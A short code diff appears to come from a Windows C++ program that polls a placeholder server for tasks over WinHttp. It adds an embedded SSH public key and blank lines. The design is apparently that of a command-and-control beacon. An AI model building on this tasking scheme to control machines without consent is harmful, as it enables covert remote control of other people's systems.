@@ -10,6 +10,8 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <future> 
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
+#define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"
+
 
 size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
 {
@@ -24,6 +26,12 @@ void tasks()
         Sleep(SLEEP);
     }
 }
+
+
+
+
+
+
 LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
     HINTERNET httpsession = WinHttpOpen(
         L"GenericAPICaller",
